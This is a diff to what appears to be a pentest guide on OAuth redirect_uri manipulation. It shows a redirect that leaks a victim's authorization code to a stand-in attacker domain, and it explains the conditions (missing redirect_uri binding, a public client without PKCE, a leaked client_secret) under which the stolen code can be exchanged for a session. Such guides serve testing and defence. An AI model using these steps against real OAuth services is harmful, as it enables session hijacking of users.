@@ -46,7 +46,7 @@ Host: oauth-as.com
 → 302 https://client-app.com.attacker.net/callback?code=VICTIM_CODE&state=xyz
 ```
 
-Your server logs `VICTIM_CODE`; replay it against the real `/callback` to obtain the session. A fresh attacker-chosen `state` does not stop this, because the attacker controls their own value.
+Your server logs `VICTIM_CODE`. The code is then useful only where you can actually exchange it, because an OAuth-compliant token endpoint binds the code to the `redirect_uri` sent at `/authorize` and will reject an exchange that presents a different one. That condition is met when any of the following holds: the token endpoint does not enforce `redirect_uri` binding; the client is a **public client without PKCE**, so you exchange the code yourself at the token endpoint using the attacker-controlled `redirect_uri` and the public `client_id` (no secret needed); or you have obtained the `client_secret`. A fresh attacker-chosen `state` does not stop the theft, because the attacker controls their own value.
 
 **Parameter pollution** variant:
 
